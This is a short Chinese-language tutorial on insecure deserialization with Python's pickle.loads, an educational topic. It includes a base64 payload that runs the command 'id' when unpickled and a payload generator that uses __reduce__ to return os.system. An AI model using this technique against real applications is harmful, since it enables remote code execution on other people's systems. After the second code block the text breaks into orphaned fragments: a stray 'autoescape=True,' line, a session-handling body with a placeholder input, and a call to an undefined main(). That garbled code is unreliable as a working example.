# Python 陷阱 - pickle

Python 的函数 `pickle.loads` 用于反序列化 Python 对象结构。然而，如果被反序列化的数据可由用户控制，攻击者就可能执行代码注入并危及存在漏洞的应用程序。

脆弱代码示例：

```python
import pickle, base64
user_data = "gASVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==" # 在反序列化期间执行代码（系统命令："id"）
file = pickle.loads(base64.b64decode(user_data))
```

攻击者可以通过创建生成序列化有效负载的 Python 脚本来利用 `pickle.loads`，该有效负载会在易受攻击的目标上执行系统命令。Python 脚本可能如下所示：

```python
import os, base64, pickle
from urllib.parse import unquote

class RCE:
    def __reduce__(self):
        cmd = "id"
        return os.system, (cmd,)

payload = pickle.dumps(RCE())
print(base64.urlsafe_b64encode(payload))
```

    autoescape=True,

    message = ""
    error = ""
    try:
        # User input (session)
        userSession = base64.b64decode(unquote("§输入§"))
        session = pickle.loads(userSession)

        if session.get("user") is not None:
            message = f"user logged in! {session.get("user")}"
        else:
            raise

    except:
        error = "Error: invalid session for user"
        
    # /tmp/templates/index.html
    print( template.get_template('index.html').render(error=error, message=message) )

main()
